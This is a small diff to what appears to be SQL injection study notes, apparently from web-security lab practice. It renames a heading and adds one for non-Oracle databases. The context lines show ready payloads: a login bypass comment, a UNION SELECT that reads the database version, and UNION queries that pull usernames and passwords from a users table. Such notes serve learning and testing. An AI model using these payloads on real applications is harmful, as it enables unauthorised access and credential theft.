@@ -32,7 +32,7 @@ administrator'--
 '+UNION+SELECT+@@version,+NULL#
 ```
 ---
-**Listing database contents from other tables on Oracle database**
+**Listing database contents from other tables on Oracle databases**
   - Determine the number of columns being returned by the query and which columns contain text data
 ```
 '+UNION+SELECT+'abc','def'+FROM+dual--
@@ -50,3 +50,4 @@ administrator'--
 '+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
 ```
 ---
+**Listing database contents from other tables on non-Oracle databases**
